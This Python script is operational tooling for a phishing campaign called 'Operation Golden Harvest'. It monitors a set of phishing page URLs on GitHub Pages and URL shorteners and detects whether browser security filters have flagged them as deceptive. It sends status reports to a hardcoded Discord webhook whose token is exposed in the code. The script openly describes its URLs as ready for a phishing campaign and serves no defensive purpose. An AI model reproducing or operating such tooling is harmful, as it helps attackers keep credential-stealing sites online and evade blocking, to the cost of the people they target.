#!/usr/bin/env python3
"""
🔍 DEPLOYMENT STATUS CHECKER - Operation Golden Harvest
Quick check af alle vores phishing URLs og deployment status
"""

import requests
import json
from datetime import datetime
import time

class DeploymentChecker:
    def __init__(self):
        self.urls = {
            'Main GitHub Page': 'https://jeki1234121.github.io/hollistisk-v2/holistisk-ny.html',
            'Mobile Variant': 'https://jeki1234121.github.io/hollistisk-v2/mobile-invite.html',
            'TinyURL Shortener': 'https://tinyurl.com/holistisk-ny',
            'is.gd Backup': 'https://is.gd/BUX4oA'
        }
        
        self.discord_webhook = 'https://discord.com/api/webhooks/1417361152371064902/DEw6e804zQB6oLB2jWuLvkTPhzMn6aQvsP-GV75mnOY1TWBmAuI9T1H7b9MoGJTSSbmM'
    
    def check_all_urls(self):
        """Check status of all deployment URLs"""
        print("🔍 CHECKING DEPLOYMENT STATUS")
        print("=" * 50)
        
        results = {}
        
        for name, url in self.urls.items():
            try:
                print(f"Checking {name}...", end=" ")
                
                response = requests.get(url, timeout=10, allow_redirects=True)
                
                if response.status_code == 200:
                    status = "✅ ONLINE"
                    blocked = self._check_if_blocked(response.text)
                    
                    if blocked:
                        status += " ⚠️ (Possibly blocked by some browsers)"
                    
                else:
                    status = f"❌ ERROR ({response.status_code})"
                
                results[name] = {
                    'url': url,
                    'status': response.status_code,
                    'online': response.status_code == 200,
                    'response_time': response.elapsed.total_seconds(),
                    'blocked': blocked if response.status_code == 200 else True
                }
                
                print(status)
                
            except Exception as e:
                print(f"❌ FAILED ({str(e)})")
                results[name] = {
                    'url': url,
                    'status': 'ERROR',
                    'online': False,
                    'error': str(e)
                }
        
        self._send_status_report(results)
        return results
    
    def _check_if_blocked(self, html_content):
        """Check if page might be blocked by security filters"""
        blocked_indicators = [
            'deceptive site',
            'security warning',
            'blocked by',
            'malicious',
            'phishing',
            'dangerous'
        ]
        
        content_lower = html_content.lower()
        for indicator in blocked_indicators:
            if indicator in content_lower:
                return True
        
        return False
    
    def _send_status_report(self, results):
        """Send deployment status to Discord"""
        online_count = sum(1 for r in results.values() if r.get('online', False))
        total_count = len(results)
        
        status_emoji = "✅" if online_count == total_count else "⚠️" if online_count > 0 else "❌"
        
        message = f"{status_emoji} **DEPLOYMENT STATUS REPORT**\\n\\n"
        message += f"📊 **Status:** {online_count}/{total_count} URLs online\\n"
        message += f"⏰ **Checked:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\\n\\n"
        
        for name, result in results.items():
            if result.get('online'):
                blocked_text = " (⚠️ Blocked)" if result.get('blocked') else ""
                message += f"✅ **{name}**{blocked_text}\\n"
                message += f"   └ {result.get('response_time', 0):.2f}s response\\n"
            else:
                message += f"❌ **{name}**\\n"
                message += f"   └ {result.get('error', 'Unknown error')}\\n"
        
        message += f"\\n🎯 **Ready for Operation Golden Harvest deployment!**"
        
        try:
            requests.post(
                self.discord_webhook,
                json={'content': message},
                timeout=5
            )
        except:
            pass
    
    def monitor_continuous(self, interval_minutes=15):
        """Continuously monitor deployment status"""
        print(f"🔄 Starting continuous monitoring (every {interval_minutes} minutes)")
        print("Press Ctrl+C to stop")
        
        try:
            while True:
                self.check_all_urls()
                print(f"\n⏰ Next check in {interval_minutes} minutes...")
                time.sleep(interval_minutes * 60)
        except KeyboardInterrupt:
            print("\n🛑 Monitoring stopped")

def main():
    """Main function"""
    checker = DeploymentChecker()
    
    print("🔍 DEPLOYMENT CHECKER - Operation Golden Harvest")
    print("=" * 60)
    
    # Quick check
    results = checker.check_all_urls()
    
    print("\n📊 SUMMARY:")
    online_urls = [name for name, result in results.items() if result.get('online')]
    
    if online_urls:
        print("✅ ONLINE URLs:")
        for name in online_urls:
            url = results[name]['url']
            print(f"   • {name}: {url}")
    
    offline_urls = [name for name, result in results.items() if not result.get('online')]
    if offline_urls:
        print("\n❌ OFFLINE URLs:")
        for name in offline_urls:
            print(f"   • {name}")
    
    print(f"\n🎯 {len(online_urls)}/{len(results)} URLs ready for phishing campaign!")

if __name__ == "__main__":
    main()